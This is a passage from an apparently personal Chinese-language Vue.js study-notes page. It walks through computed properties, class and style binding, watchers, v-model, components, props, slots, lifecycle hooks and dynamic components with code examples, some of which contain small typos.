&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; baidu: &#123; name: &quot;百度&quot;, content: [&quot;前端&quot;， &quot;Java&quot;, &quot;python&quot;] &#125; &#125; &#125;, // 计算属性 computed: &#123; baiduContent() &#123; return this.baidu.content.length &gt; 0 ? &quot;Yes&quot; : &quot;No&quot; &#125; &#125; &#125;&lt;/script&gt; 计算属性缓存 VS 方法 可以注意到计算属性中仍然使用的时方法来进行表达式运算。 因此在methods中设计一个函数，然后再模板中调用函数也能达到一样的效果 那么两者有什么区别呢？ 重点区别： 计算属性：计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算 方法：方法调用总是会在重渲染发生时再次执行函数 Class绑定 数据绑定的一个常见需求场景时操纵元素的CSS class列表，因为calss也是属性，因此可以使用v-bind将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易错的。因此Vue专门为class的v-bind用法提供了特殊的功能增强。除了字符串外，class绑定的值也可以是对象和数组 123456789101112131415&lt;template&gt; &lt;div :class=&quot;&#123; &#x27;active&#x27;: isActive, &#x27;text-danger&#x27;: hasError&#125;&quot;&gt; isActive &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; isActive: true, hasError: true &#125; &#125; &#125;&lt;/script&gt; 多个对象绑定 1234567891011121314151617&lt;template&gt; &lt;div :class=&quot;classObject&quot;&gt; Class &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; classObject: &#123; &#x27;active&#x27;: true, &#x27;text-danger&#x27;: true &#125; &#125; &#125; &#125;&lt;/script&gt; 绑定数组 123456789101112131415&lt;template&gt; &lt;div :class=&quot;[activeClass, errorClass]&quot;&gt; isActive &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; activeClass: &#x27;active&#x27;, errorClass: &#x27;text-danger&#x27; &#125; &#125; &#125;&lt;/script&gt; 数组中也支持使用三目运算符 1234567891011121314&lt;template&gt; &lt;div :class=&quot;[isactive ? &#x27;active text-danger&#x27; : &#x27;&#x27;]&quot;&gt; isActive &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; isActive: true, &#125; &#125; &#125;&lt;/script&gt; 数组和对象也能混合使用 123456789101112131415&lt;template&gt; &lt;div :class=&quot;[&#123;&#x27;active&#x27;: isActive&#125;, errorClass]&quot;&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; isActive: true, errorClass: &quot;text-danger&quot; &#125; &#125; &#125;&lt;/script&gt; 注意事项 数组和对象嵌套过程中，只能是数组嵌套对象，反过来不行 style绑定 数据绑定的一个常见需求场景是操纵元素的CSS style列表，style也可以使用v-bind进行绑定，但与Class一样，style绑定同样支持对象和数组 需要注意的是和React一样，style中的属性需要使用驼峰命名法。否则需要使用‘’包裹 123456789101112131415&lt;template&gt; &lt;div :style=&quot;&#123; color: activeColor, fontSize: fontSize + &#x27;px&#x27;&#125;&quot;&gt; Style绑定 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; activeColor: &#x27;red&#x27;, fontSize: 30 &#125; &#125; &#125;&lt;/script&gt; 1234567891011121314151617&lt;template&gt; &lt;div :style=&quot;styleObject&quot;&gt; Style绑定 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; styleObject: &#123; color: &#x27;red&#x27;, fontSize: &#x27;30px&#x27; &#125; &#125; &#125; &#125;&lt;/script&gt; 1234567891011121314151617&lt;template&gt; &lt;div :style=&quot;[styleObject]&quot;&gt; Style绑定 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; styleObject: &#123; color: &#x27;green&#x27;, fontSize: &#x27;30px&#x27; &#125; &#125; &#125; &#125;&lt;/script&gt; 不推荐使用数组形式 侦听器 可以通过watch选项在每次响应式属性发生变化时触发一个函数 123456789101112131415161718192021222324252627282930313233&lt;template&gt; &lt;div&gt; &lt;h3&gt; 侦听器 &lt;/h3&gt; &lt;P&gt; &#123;&#123; message &#125;&#125; &lt;/P&gt; &lt;button @click=&quot;updateHandle&quot;&gt; 修改数据 &lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; message: &quot;Hello&quot;; &#125; &#125;, methods: &#123; updateHandle() &#123; this.message = World; &#125; &#125;, watch: &#123; message(newValue, oldValue) &#123; console.log(newValue); console.log(oldValue); &#125; &#125; &#125;&lt;/script&gt; 注意事项： watch函数需要与被监听的响应式数据同名 表单输入绑定v-model 前端处理表单时，常需要将表单输入框的内容同步给JS中相应的变量。手动连接值绑定和更改事件侦听器会很麻烦，v-model简化了这一步骤 输入框 123456789101112131415&lt;template&gt; &lt;input type=&quot;text&quot; v-model=&quot;message&quot;&gt; &lt;p&gt; &#123;&#123; message &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; message: &quot;&quot; &#125; &#125; &#125;&lt;/script&gt; 复选框 12345678910111213 &lt;template&gt; &lt;input type=&quot;checkbox&quot; id=&quot;checkbox&quot; v-model=&quot;checked&quot;&gt; &lt;label for=&quot;checkbox&quot;&gt;&#123;&#123; checked &#125;&#125;&lt;/label&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; checked: true &#125; &#125; &#125;&lt;/script&gt; 修饰符 v-model也提供了修饰符： .lazy .number 只接受输入的数组 .trim 去掉输入前后的空格 .lazy 默认情况下v-model会在每次input事件后更新数据，可以添加lazy修饰符来改为每次change事件后更新数据 例如input标签默认会在失焦后出发change事件 123456789101112131415&lt;template&gt; &lt;input type=&quot;text&quot; v-model.lazy=&quot;message&quot;&gt; &lt;p&gt; &#123;&#123; message &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; message: &quot;&quot; &#125; &#125; &#125;&lt;/script&gt; Vue3 在Vue3中，v-module具有许多新特性： 支持多个v-module绑定 支持自定义修饰符Modifiers 自定义组件的v-model发生了变化： 接收方式prop由value变为了modelValue 更新事件emit由input变为了update:modelValue v-bind的.sync修饰符和组件的model选项被移除 父组件给A组件绑定多个v-model并且包含一个自定义修饰符： 1234567891011121314151617181920212223&lt;script setup lang=&quot;ts&quot;&gt;import A from &#x27;./components/A.vue&#x27;;const showA = ref&lt;boolean&gt;(true)const dialogText = ref&lt;string&gt;(&quot;Ender&quot;)&lt;/script&gt;&lt;template&gt; &lt;div&gt; &lt;h1&gt;我是父组件&lt;/h1&gt; &lt;div&gt;showA: &#123;&#123; showA &#125;&#125;&lt;/div&gt; &lt;hr&gt; &lt;div&gt;dialogText: &#123;&#123; dialogText &#125;&#125;&lt;/div&gt; &lt;div&gt;&lt;button @click=&quot;showA = !showA&quot;&gt;开关&lt;/button&gt;&lt;/div&gt; &lt;hr&gt; &lt;!-- 多v-model时需要使用:指定名称 --&gt; &lt;!-- 使用自定义修饰符isMagic --&gt; &lt;A v-model:textValue.isMagic=&quot;dialogText&quot; v-model=&quot;showA&quot;&gt;&lt;/A&gt; &lt;/div&gt;&lt;/template&gt;&lt;style scoped&gt;&lt;/style&gt; A组件通过props接收绑定的值，并利用emit实现双向绑定： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;script setup lang=&quot;ts&quot;&gt;const props = defineProps&lt;&#123; // vue3默认使用modelValue接收，vue2中使用value modelValue: boolean, textValue: string, // 获取自定义修饰符的命名是固定的，即“被修饰属性” + “Modifiers” textValueModifiers?: &#123; isMagic: boolean &#125;,&#125;&gt;()// 使用emit的方式操作v-model绑定的变量。命名规定要以update:开头const emit = defineEmits([&#x27;update:modelValue&#x27;, &#x27;update:textValue&#x27;])const closeDialog = () =&gt; &#123; // 直接将要修改的值作为参数传递 emit(&#x27;update:modelValue&#x27;, false)&#125;const changeInputValue = (e:Event) =&gt; &#123; const target = e.target as HTMLInputElement emit(&#x27;update:textValue&#x27;, props?.textValueModifiers?.isMagic ? target.value + &quot; Magic&quot; : target.value)&#125;&lt;/script&gt;&lt;template&gt; &lt;div v-if=&quot;modelValue&quot; class=&quot;model&quot;&gt; &lt;div class=&quot;close&quot;&gt;&lt;button @click=&quot;closeDialog&quot;&gt;关闭&lt;/button&gt;&lt;/div&gt; &lt;h3&gt;我是子组件model-dialog&lt;/h3&gt; &lt;div&gt;内容：&lt;input @input=&quot;changeInputValue&quot; :value=&quot;textValue&quot; type=&quot;text&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt;.model &#123; width: 500px; border: 5px solid #ccc; padding: 10px;&#125;&lt;/style&gt; 模板引用(读取DOM) 虽然Vue的声明性渲染模型抽象掉了大部分对DOM的直接操作，但在某些情况下，我们仍然需要直接访问底层DOM元素。此时需要使用ref属性 挂载结束后引用都会被暴露在this.$refs之上 1234567891011121314151617181920&lt;template&gt; &lt;div ref=&quot;container&quot; class=&quot;container&quot;&gt;&#123;&#123; content &#125;&#125;&lt;/div&gt; &lt;button @click=&quot;getElementHandle&quot;&gt; 获取元素 &lt;/button&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; content: &quot;内容&quot; &#125; &#125;, methods: &#123; getElementHandle() &#123; console.log(this.$refs.container.innerHTML = &quot;哈哈哈哈&quot;); &#125; &#125; &#125;&lt;/script&gt; 注意事项： 非特殊情况不要操作DOM 因为直接操作DOM很消耗性能 组件基础 由三部分组成： script js代码的存放处 template html标签代码 style css样式代码 一般会将Vue组件定义为一个单独的.vue文件中，这被称为单文件组件（SFC） 单文件组件sfc 1234567891011&lt;template&gt; &lt;div&gt; 承载标签 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123;&#125;&lt;/script&gt;&lt;!-- scoped: 让当前样式只在当前组件中生效 --&gt;&lt;style scoped&gt;&lt;/style&gt; 组件引用 123456789101112131415161718&lt;template&gt; &lt;!-- 显示组件 --&gt; &lt;MyComponen /&gt; &lt;!-- 显示组件时还能使用如下命名方式 --&gt; &lt;my-componen /&gt;&lt;/template&gt;&lt;script&gt; // 引入组件 import MyComponent from &#x27;./component/MyComponent.vue&#x27; // 注入组件 export default &#123; components: &#123; MyComponent &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 单文件组件中只能出现一个template，且setup形式的script标签块只能有一个 每个组件必须抱恨一个template 组件嵌套关系 组件尝被层层嵌套为树形结构 创建组件及引用关系 Header 1234567891011121314151617181920&lt;template&gt; &lt;h3&gt; Header &lt;/h3&gt;&lt;/template&gt;&lt;script&gt; export default &#123; &#125;&lt;/script&gt;&lt;style scoped&gt; h3&#123; width: 100%; height: 100%; border: 5px solid #999; text-align: center; line-height: 100px; box-sizing: border-box; &#125;&lt;/style&gt; Main 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div class=&quot;main&quot;&gt; &lt;h3&gt; Main &lt;/h3&gt; &lt;Article /&gt; &lt;Article /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import Article from &#x27;./Article.vue&#x27; export default &#123; components: &#123; Article &#125; &#125;&lt;/script&gt;&lt;style scoped&gt; .main&#123; float: left; width: 70%; height: 600px; border: 5px solid #999; box-sizing: border-box; &#125;&lt;/style&gt; Asid 123456789101112131415161718192021&lt;template&gt; &lt;div class=&quot;aside&quot;&gt; &lt;h3&gt; Aside &lt;/h3&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; &#125;&lt;/script&gt;&lt;style scoped&gt; .aside&#123; float: right; width: 30%; height: 600px; border: 5px solid #999; box-sizing: border-box; &#125;&lt;/style&gt; Article 123456789101112131415161718192021222324252627&lt;template&gt; &lt;h3&gt; Article &lt;/h3&gt; &lt;Item /&gt; &lt;Item /&gt; &lt;Item /&gt;&lt;/template&gt;&lt;script&gt; import Item from &quot;./Item.vue&quot; export default &#123; components: &#123; Item &#125; &#125;&lt;/script&gt;&lt;style scoped&gt; h3&#123; width: 80%; margin: 0 auto; text-align: center; line-height: 100px; box-sizing: border-box; margin-top: 50px; background: #999; &#125;&lt;/style&gt; Item 123456789101112131415161718192021&lt;template&gt; &lt;h3&gt; Item &lt;/h3&gt;&lt;/template&gt;&lt;script&gt; export default &#123; &#125;&lt;/script&gt;&lt;style scoped&gt; h3&#123; width: 80%; margin: 0 auto; text-align: center; line-height: 100px; box-sizing: border-box; margin-top: 10px; background: #999; &#125;&lt;/style&gt; 组件注册方式 Vue组件使用前需要先被注册，注册组件有两种方式： 全局注册 局部注册 全局注册 在最外层注册一次后，所有子组件中都能引用 123456789import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import GlobalComponent from &quot;./components/GlobalComponent.vue&quot;const app = createApp(App);// 名字 + 组件// 之后使用该组件直接使用名字就行app.component(&quot;GlobalComponent&quot;, GlobalComponent)app.mount(&#x27;#app&#x27;); 12345&lt;template&gt; &lt;h3&gt; 全局应用组件 &lt;/h3&gt;&lt;/template&gt; 局部注册 全局注册虽然方便，但存在一下问题： 全局注册时，没有被使用的组件也会被打包到项目中去 全局注册在大型项目的使用中，依赖关系会变得不明确，不利于观察父子关系，可维护性低 123456789101112131415&lt;template&gt; &lt;GlobalComponent /&gt;&lt;/template&gt;&lt;script&gt; import Item from &quot;./GlobalComponent.vue&quot; export default &#123; GlobalComponent &#125;&lt;/script&gt;&lt;style scoped&gt; *&#123; margin: 0; padding: 0; &#125;&lt;/style&gt; 组件参数传递 Vue使用Props处理组件间通信 Parent 在父组件使用属性的形式，为子组件添加数据 12345678910111213141516171819202122232425262728&lt;template&gt; &lt;h3&gt; Parent &lt;/h3&gt; &lt;Child title=&quot;Parent数据&quot; /&gt; &lt;!-- 此外还可以使用v-bind传递动态数据 --&gt; &lt;Child :activeTitle=&quot;message&quot; :names=&quot;names&quot; :userInfo=&quot;userInfo&quot; /&gt;&lt;/template&gt;&lt;script&gt; import Child from &quot;./Child.vue&quot; export default &#123; data() &#123; return&#123; childMessage: 20, names: [&quot;iwen&quot;, &quot;ime&quot;, &quot;frank&quot;], userInfo: &#123; name: &quot;iwen&quot;m age: 20 &#125; &#125; &#125;, components: &#123; Child &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; Child 在子组件中使用props接受这些属性名 123456789101112131415161718192021222324252627&lt;template&gt; &lt;h3&gt; Child &lt;/h3&gt; &lt;p&gt; &#123;&#123; title &#125;&#125; &lt;/p&gt; &lt;ul&gt; &lt;li v-for=&quot;(item, index) of names&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;p&gt; &#123;&#123; userInfo.name &#125;&#125; &lt;/p&gt; &lt;p&gt; &#123;&#123; userInfo.age &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; &#125;, props: [&quot;title&quot;, &quot;activeTitle&quot;, &quot;names&quot;, &quot;userInfo&quot;] &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 注意事项： props传递数据，只能父组件传递给子组件 props类型校验 parent 123456789101112131415161718192021&lt;template&gt; &lt;h3&gt; Parent &lt;/h3&gt; &lt;Child :title=&quot;childMessage&quot; /&gt;&lt;/template&gt;&lt;script&gt; import Child from &quot;./Child.vue&quot; export default &#123; data() &#123; return&#123; childMessage: 20, &#125; &#125;, components: &#123; Child &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; child 子组件中使用type进行校验，支持多类型 还可以使用default设置默认值，当没有传递该参数时，直接使用该默认值 如果希望某个参数必须传值，那么可以使用required将其设置为必选项 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt; &lt;h3&gt; Child &lt;/h3&gt; &lt;p&gt; &#123;&#123; title &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; &#125;, props: &#123; title: &#123; // 多类校验 type: [String, Number], // 必选项 required: true &#125;, age: &#123; type: Number, // 默认值 default: 0 &#125;, names: &#123; type: Array, // 工厂函数设置默认值 defalut() &#123; return [&quot;Empty&quot;] &#125; &#125; &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 注意事项： 数字和字符串可以直接使用default作为默认值，但数组和对象，必须通过工厂函数返回默认值，即使用default的函数形式进行返回。 其次props是只读的 组件事件 组件数据传递 透传Attributes（属性继承） 插槽Slots 组件除了数据，还能接受模板内容，某些时候可能需要为子组件传递一些模板片段，让子组件在它们的组件中渲染这些片段 12345678910111213141516171819202122232425&lt;template&gt; &lt;h3&gt; ComponentA &lt;/h3&gt; &lt;ComponentB&gt; &lt;template&gt; &lt;h3&gt; 插槽传递试图内容 &lt;/h3&gt; &lt;/template&gt; &lt;/ComponentB&gt;&lt;/template&gt;&lt;script&gt; import ComponentB from &quot;./ConponentB.vue&quot; export default &#123; data() &#123; &#125;, components: &#123; ComponentB &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 在子组件中可以使用slot来显示插入的模板内容 slot元素是一个插槽出口（slot outlet），标示了父元素提供的**插槽内容（slot content）**将在哪里渲染 123456789101112131415&lt;template&gt; &lt;h3&gt; ComponentB &lt;/h3&gt; &lt;slot&gt;&lt;/slot&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 渲染作用域 插槽内容可以访问到父组件的数据作用域，因为插槽内容本身实在父组件模板中定义的 123456789101112131415161718192021222324252627&lt;template&gt; &lt;h3&gt; ComponentA &lt;/h3&gt; &lt;ComponentB&gt; &lt;template v-slot&gt; &lt;h3&gt; &#123;&#123; message &#125;&#125; &lt;/h3&gt; &lt;/template&gt; &lt;/ComponentB&gt;&lt;/template&gt;&lt;script&gt; import ComponentB from &quot;./ConponentB.vue&quot; export default &#123; data() &#123; return &#123; message: &quot;message在父级&quot; &#125; &#125;, components: &#123; ComponentB &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 插槽默认内容 在外部没有提供任何内容的情况下，可以为插槽指定默认内容 123456&lt;template&gt; &lt;h3&gt; ComponentB &lt;/h3&gt; &lt;slot&gt;插槽默认值&lt;/slot&gt;&lt;/template&gt; 具名插槽 当我们想要设置多个不同的插槽时，需要指定名字 在父组件中使用v-slot来指定插槽名字，也可以使用简写# 1234567891011121314151617181920212223242526272829303132&lt;template&gt; &lt;h3&gt; ComponentA &lt;/h3&gt; &lt;ComponentB&gt; &lt;template v-slot:header&gt; &lt;h3&gt; &#123;&#123; message &#125;&#125; &lt;/h3&gt; &lt;/template&gt; &lt;template #main&gt; &lt;h3&gt; &#123;&#123; message &#125;&#125; &lt;/h3&gt; &lt;/template&gt; &lt;/ComponentB&gt;&lt;/template&gt;&lt;script&gt; import ComponentB from &quot;./ConponentB.vue&quot; export default &#123; data() &#123; return &#123; message: &quot;message在父级&quot; &#125; &#125;, components: &#123; ComponentB &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 在子组件中使用name为插槽命名： 1234567891011121314151617&lt;template&gt; &lt;h3&gt; ComponentB &lt;/h3&gt; &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt; &lt;hr&gt; &lt;slot name=&quot;main&quot;&gt;&lt;/slot&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 插槽混合数据 slot除了显示父组件的数据以外，实际上是可以通过其他方式显示子组件的数据的 slot支持使用类似props传递属性的方式，向插槽的出口传递数据 父组件可以使用v-slot中的对象对子组件中传递的数据进行显示 123456789101112131415161718192021222324252627&lt;template&gt; &lt;h3&gt; ComponentA &lt;/h3&gt; &lt;ComponentB&gt; &lt;template v-slot=&quot;&#123; slotProps &#125;&quot;&gt; &lt;h3&gt; &#123;&#123; message &#125;&#125; - &#123;&#123; slotProps.msg &#125;&#125; &lt;/h3&gt; &lt;/template&gt; &lt;/ComponentB&gt;&lt;/template&gt;&lt;script&gt; import ComponentB from &quot;./ConponentB.vue&quot; export default &#123; data() &#123; return &#123; message: &quot;message在父级&quot; &#125; &#125;, components: &#123; ComponentB &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 123456789101112131415161718&lt;template&gt; &lt;h3&gt; ComponentB &lt;/h3&gt; &lt;slot :msg=&quot;childMessage&quot;&gt;&lt;/slot&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; childMessage: &quot;子组件数据&quot; &#125; &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 对于具名组件，在父组件中=可以写在名称后进行数据接收： 123456789&lt;template&gt; &lt;ComponentB&gt; &lt;template #header=&quot;slotProps&quot;&gt; &lt;h3&gt; &#123;&#123; message &#125;&#125; - &#123;&#123; slotProps.msg &#125;&#125; &lt;/h3&gt; &lt;/template&gt; &lt;/ComponentB&gt;&lt;/template&gt; 动态插槽 插槽的名称还可以是一个变量，允许我们动态的修改插槽内容插入的位置，例如： 插槽子组件： 1234567891011121314151617&lt;template&gt; &lt;h3&gt; ComponentB &lt;/h3&gt; &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt; &lt;hr&gt; &lt;slot name=&quot;main&quot;&gt;&lt;/slot&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 使用[]可以放入一个响应式对象来根据其中的值确定插槽的名称 插槽内容父组件： 12345678910111213141516171819&lt;template&gt; &lt;h3&gt; ComponentA &lt;/h3&gt; &lt;ComponentB&gt; &lt;template #[name]&gt; &lt;h3&gt; 插槽传递内容 &lt;/h3&gt; &lt;/template&gt; &lt;/ComponentB&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; import ComponentB from &quot;./ConponentB.vue&quot; import &#123; reactive, ref &#125; from &#x27;vue&#x27; let name = ref(&#x27;header&#x27;)&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 此时动态的修改name中的值即可改变插入的位置。 组件生命周期 其中有如下生命周期比较重要： 创建期 beforeCreate created 挂载期 beforeMount mounted 更新期 beforeUpdate updated 销毁期 beforeUnmount unmounted 在组件的完整生命周期中，可以在这些自动执行的钩子函数中进行一些操作： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;template&gt; &lt;h3&gt; 组件生命周期 &lt;/h3&gt; &lt;p&gt; &#123;&#123; message &#125;&#125; &lt;/p&gt; &lt;button @click=&quot;updateHandle&quot;&gt; 更新数据 &lt;/button&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; message: &quot;更新之前&quot; &#125; &#125;, components: &#123; ComponentB &#125;, methods: &#123; updateHandle() &#123; this.message = &quot;更新之后&quot; &#125; &#125;, beforeCreate() &#123; console.log(&quot;组件创建之前&quot;) &#125;, create() &#123; console.log(&quot;组件创建完成&quot;) &#125;, beforeMount() &#123; console.log(&quot;组件挂载之前&quot;) &#125;, Mounted() &#123; console.log(&quot;组件挂载完成&quot;) &#125;, beforeUpdate() &#123; console.log(&quot;组件更新之前&quot;) &#125;, upadte() &#123; console.log(&quot;组件更新完成&quot;) &#125;, beforeUnmount() &#123; console.log(&quot;组件销毁之前&quot;) &#125;, unmounted() &#123; console.log(&quot;组件销毁完成&quot;) &#125; &#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt; 例如我们可以在挂载完成之后获取到某个节点的DOM结构 123456789101112131415161718&lt;template&gt; &lt;h3&gt; 生命周期应用 &lt;/h3&gt; &lt;p ref = &quot;name&quot;&gt; 阿巴阿巴 &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; beforeMount() &#123; console.log(this.$ref.name); // undefined &#125;, mounted() &#123; console.log(this.$ref.name); &#125; &#125;&lt;/script&gt; 可以在组件创建后从网络请求中获取数据，以为创建完成后，data才会变为可用的状态 123456789101112131415161718192021222324252627282930313233343536&lt;template&gt; &lt;h3&gt; 生命周期应用 &lt;/h3&gt; &lt;ul&gt; &lt;li v-for=&quot;(item, index) of banner&quot; :key=&quot;item.key&quot;&gt; &lt;h3&gt; &#123;&#123; item.title &#125;&#125; &lt;/h3&gt; &lt;p&gt; &#123;&#123; item.content &#125;&#125; &lt;/p&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; banner: [] &#125; &#125;, mounted() &#123; this.banner = [ &#123; &quot;title&quot;: &quot;bibubibu&quot;, &quot;content&quot;: &quot;wahahah&quot;, &quot;key&quot;: &quot;1&quot; &#125; ] &#125;, mounted() &#123; console.log(this.$ref.name); &#125; &#125;&lt;/script&gt; 注意事项 但通常情况下，带有网络请求的页面中，认为结构比数据更重要，因此通常网络请求会被放在mounted中，来达到先渲染结构再获取数据的效果 动态组件 有些场景需要几个组件间来回切换，比如Tab界面 A组件 1234567&lt;template&gt; &lt;h3&gt; ComponentA &lt;/h3&gt;&lt;/template&gt;&lt;script&gt;&lt;/script&gt; B组件 1234567&lt;template&gt; &lt;h3&gt; ComponentB &lt;/h3&gt;&lt;/template&gt;&lt;script&gt;&lt;/script&gt; 容器组件可以使用vue提供的component标签处理多组件切换 1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;h3&gt; 容器 &lt;/h3&gt; &lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt; &lt;button @click=&quot;changeHandle&quot;&gt; 切换组件 &lt;/button&gt;&lt;/template&gt;&lt;script&gt; import ComponentA from &quot;./ComponentA.vue&quot; import ComponentB from &quot;./ComponentB.vue&quot; export default &#123; data() &#123; return &#123; tabComponent: &quot;ComponentA&quot; &#125; &#125;, methods: &#123; changeHandle()&#123; this.tabComponent = this.tabComponent == &quot;ComponentA&quot; ? &quot;ComponentB&quot; : &quot;ComponentA&quot; &#125; &#125; components: &#123; ComponentA, ComponentB &#125; &#125;&lt;/script&gt; 组合式API的写法 使用组合式API中的steup语法糖可以省略选项式API中的注册组件步骤，但要将组件变为响应式对象： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;template&gt; &lt;div style=&quot;display:flex&quot;&gt; &lt;div @click=&quot;switchCom(item, index)&quot; :class=&quot;[active == index ? &#x27;active&#x27; : &#x27;&#x27;]&quot; class=&quot;tab&quot; v-for=&quot;(item, index) in data&quot; :key=&quot;index&quot; &gt; &lt;div&gt; &#123;&#123; item.name &#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;component :is=&quot;comId&quot;&gt;&lt;/component&gt; &lt;button @click=&quot;changeHandle&quot;&gt; 切换组件 &lt;/button&gt;&lt;/template&gt;&lt;script setup lang=&#x27;ts&#x27;&gt; import &#123; ref, reactive, markRaw, shallowRef &#125; from &#x27;vue&#x27; import ComponentA from &quot;./ComponentA.vue&quot; import ComponentB from &quot;./ComponentB.vue&quot; const comId = shallowRef(ComponentA) const active = ref(0) const data = reactive([ &#123; name: &#x27;A组件&#x27;, com: markRaw(ComponentA) &#125;, &#123; name: &#x27;B组件&#x27;, com: markRaw(ComponentB) &#125; ]) const switchCom = (item, index) =&gt; &#123; comId.value = item.com active.value = index &#125;&lt;/script&gt;&lt;style scoped lang=&quot;less&quot;&gt; .active&#123; background: skyblue; &#125; .tabs&#123; border: 1px solid #ccc; padding: 5px 10px; margin: 5px; &#125;&lt;/style&gt; 注意事项: 此处comId需要使用shallowRef注册为响应式对象而不使用reactive, ref是因为避免由于组件内部的改变导致该组件的切换模块更新 此处reactive注册的datalist中需要使用markRaw来避免其中组件内部的改变而触发datalist的更新 对于组件的注册还可以使用类似选项式API的做法，使用字符串代替组件名： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;template&gt; &lt;div style=&quot;display:flex&quot;&gt; &lt;div @click=&quot;switchCom(item, index)&quot; :class=&quot;[active == index ? &#x27;active&#x27; : &#x27;&#x27;]&quot; class=&quot;tab&quot; v-for=&quot;(item, index) in data&quot; :key=&quot;index&quot; &gt; &lt;div&gt; &#123;&#123; item.name &#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;component :is=&quot;comId&quot;&gt;&lt;/component&gt; &lt;button @click=&quot;changeHandle&quot;&gt; 切换组件 &lt;/button&gt;&lt;/template&gt;&lt;script setup lang=&#x27;ts&#x27;&gt; import &#123; ref, reactive &#125; from &#x27;vue&#x27; const comId = ref(&#x27;ComponentA&#x27;) const active = ref(0) const data = reactive([ &#123; name: &#x27;A组件&#x27;, com: &#x27;ComponentA&#x27; &#125;, &#123; name: &#x27;B组件&#x27;, com: &#x27;ComponentB&#x27; &#125; ]) const switchCom = (item, index) =&gt; &#123; comId.value = item.com active.value = index &#125;&lt;/script&gt;&lt;script lang=&#x27;ts&#x27;&gt; import ComponentA from &quot;./ComponentA.vue&quot; import ComponentB from &quot;./ComponentB.vue&quot; export default&#123; components: &#123; ComponentA, ComponentB &#125; &#125;&lt;/script&gt;&lt;style scoped lang=&quot;less&quot;&gt; .active&#123; background: skyblue; &#125; .tabs&#123; border: 1px solid #ccc; padding: 5px 10px; margin: 5px; &#125;&lt;/style&gt; 组件保持存活 在直接使用&lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt;时，被切换掉的组件会被卸载，可以通过&lt;keep-alive&gt;组件强制将其保持“存活”状态 该组件包含一个include属性： 1234&lt;keep-alive :include=&quot;[&#x27;A&#x27;]&quot;&gt; &lt;A v-if=&quot;flag&quot;&gt;&lt;/A&gt; &lt;B 